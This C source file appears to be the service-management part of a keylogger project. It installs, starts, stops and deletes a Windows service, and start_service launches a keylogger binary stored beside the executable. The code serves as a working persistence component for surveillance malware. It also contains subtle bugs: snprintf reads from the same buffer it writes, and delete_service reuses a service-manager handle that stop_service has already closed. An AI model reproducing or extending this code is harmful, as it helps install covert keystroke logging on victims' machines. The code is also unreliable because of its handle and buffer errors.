#include "svc.h"

void install_service(SC_HANDLE scm)
{
	// Get the full path of this executable.
	TCHAR unquoted_path[MAX_PATH];
	if (!GetModuleFileName(NULL, unquoted_path, MAX_PATH))
	{
		print_error("Failed to get module file name");
		return;
	}

	// Quote the path to handle spaces.
	TCHAR path[MAX_PATH];
	StringCbPrintf(path, MAX_PATH, TEXT("\"%s\""), unquoted_path);

	// Create the service.
	SC_HANDLE service = CreateService(
		scm,
		SVC_NAME,
		SVC_NAME,
		SERVICE_ALL_ACCESS,
		SERVICE_WIN32_OWN_PROCESS,
		SERVICE_DEMAND_START,
		SERVICE_ERROR_NORMAL,
		path,
		NULL,
		NULL,
		NULL,
		NULL,
		NULL);

	if (service == NULL)
	{
		print_error("Failed to create {" SVC_NAME "} service");
	}
	else
	{
		printf("Service {" SVC_NAME "} installed successfully\n");
		CloseServiceHandle(service);
	}

	CloseServiceHandle(scm);
}

void start_service(SC_HANDLE scm)
{
	// Open the service.
	SC_HANDLE service = OpenService(scm, SVC_NAME, SERVICE_ALL_ACCESS);
	if (service == NULL)
	{
		print_error("Failed to open {" SVC_NAME "} service");
		CloseServiceHandle(scm);
		return;
	}

	// Build the path to the keylogger.
	char keylogger_path[MAX_PATH] = {0};
	GetModuleFileName(NULL, keylogger_path, MAX_PATH);
	char *last_backslash = strrchr(keylogger_path, '\\');
	if (last_backslash)
	{
		*last_backslash = '\0';
	}
	snprintf(keylogger_path, MAX_PATH, "%s\\" KEYLOGGER_NAME, keylogger_path);

	// Start the service with the path as an argument.
	const char *args[] = {keylogger_path};
	if (!StartService(service, 1, args))
	{
		print_error("Failed to start {" SVC_NAME "} service");
	}
	else
	{
		printf("Service {" SVC_NAME "} started succesfully\n");
	}

	CloseServiceHandle(service);
	CloseServiceHandle(scm);
}

void stop_service(SC_HANDLE scm)
{
	// Open the service with stop rights.
	SC_HANDLE service = OpenService(scm, SVC_NAME, SERVICE_STOP);
	if (service == NULL)
	{
		print_error("Failed to open {" SVC_NAME "} service");
		CloseServiceHandle(scm);
		return;
	}

	// Send a stop control.
	SERVICE_STATUS status;
	if (!ControlService(service, SERVICE_CONTROL_STOP, &status))
	{
		print_error("Failed to stop {" SVC_NAME "} service");
	}
	else
	{
		printf("Service {" SVC_NAME "} stopped successfully\n");
	}

	CloseServiceHandle(service);
	CloseServiceHandle(scm);
}

static BOOL is_service_running(SC_HANDLE service)
{
	// Check if the service is currently running.
	SERVICE_STATUS_PROCESS ssp;
	DWORD bytes_needed;

	if (!QueryServiceStatusEx(
			service,
			SC_STATUS_PROCESS_INFO,
			(LPBYTE)&ssp,
			sizeof(SERVICE_STATUS_PROCESS),
			&bytes_needed))
	{
		print_error("Failed to query the service status");
		return FALSE;
	}

	return (ssp.dwCurrentState == SERVICE_RUNNING);
}

void delete_service(SC_HANDLE scm)
{
	// Open the service.
	SC_HANDLE service = OpenService(scm, SVC_NAME, SERVICE_ALL_ACCESS);
	if (service == NULL)
	{
		print_error("Failed to open {" SVC_NAME "} service");
		CloseServiceHandle(scm);
		return;
	}

	// If it's running, stop it first.
	if (is_service_running(service))
	{
		stop_service(scm);
		// (Reopen the service here if needed, depending on stop_service's implementation.)
		service = OpenService(scm, SVC_NAME, SERVICE_ALL_ACCESS);
		if (!service)
		{
			print_error("Failed to re-open {" SVC_NAME "} service");
			CloseServiceHandle(scm);
			return;
		}
	}

	// Delete the service.
	if (!DeleteService(service))
	{
		print_error("Failed to delete {" SVC_NAME "} service");
	}
	else
	{
		printf("Service {" SVC_NAME "} deleted successfully\n");
	}

	CloseServiceHandle(service);
	CloseServiceHandle(scm);
}
